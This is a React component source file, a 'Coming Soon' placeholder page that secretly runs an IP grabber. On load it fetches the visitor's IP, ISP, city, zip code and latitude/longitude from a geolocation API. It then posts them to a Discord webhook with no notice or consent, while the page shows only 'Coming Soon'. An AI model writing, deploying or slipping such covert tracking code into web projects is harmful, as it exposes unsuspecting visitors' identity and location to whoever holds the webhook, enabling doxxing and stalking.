import React, { useEffect } from 'react';

const DiscordWebhookLogger = () => {
  const webHookUrl = "WebHook_URL";

  useEffect(() => {
    const fetchData = async () => {
      try {

        if (!webHookUrl) {
          console.error('Webhook URL is empty or not found.');
          return;
        }

        // Fetching IP data
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        //print on console
        console.log('Fetched data:', data); 


          // Retrieve previous IP from temp storage
          const prevIp = sessionStorage.getItem('prevIp');

          // If previous IP is the same as the current one, do not send to Discord
          if (prevIp && prevIp === data.ip) {
            console.log('IP has not changed. Skipping Discord webhook.');
            return;
          }

          // Update temp storage with the current IP
          sessionStorage.setItem('prevIp', data.ip);
  

        const ip = data.ip;
        const provider = data.org + " (" + data.asn + ")";
        const timezone = data.timezone;
        const country = data.country_name;
        const region = data.region + " (" + data.region_code + ")";
        const city = data.city;
        const zip = data.postal;
        const lat = data.latitude;
        const lon = data.longitude;


        // Discord Message Structure
        const params = {
          content: 
          "```IP-Address: " + ip +
            "\n \n Timezone: " + timezone +
            "\n Provider: " + provider +
            "\n \n Country and Region: \n " + country + " - " + region +
            "\n \n Zip Code: " + zip +
            "\n City: " + city +
            "\n \n Location:\n\t"
            + "Longitude: " + lon + "\n\t"
            + "Latitude: " + lat + "```"
        };



        await fetch(webHookUrl, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify(params),
        });

        


      } catch (error) {
        console.error('Error fetching IP address:', error);
      }
    };

    fetchData();

  
  }, []);

  return (

    
    <div>
      <h3>Coming Soon</h3>
      {/* You can display additional information or feedback to the user if needed */}
    </div>
  );
};

export default DiscordWebhookLogger;
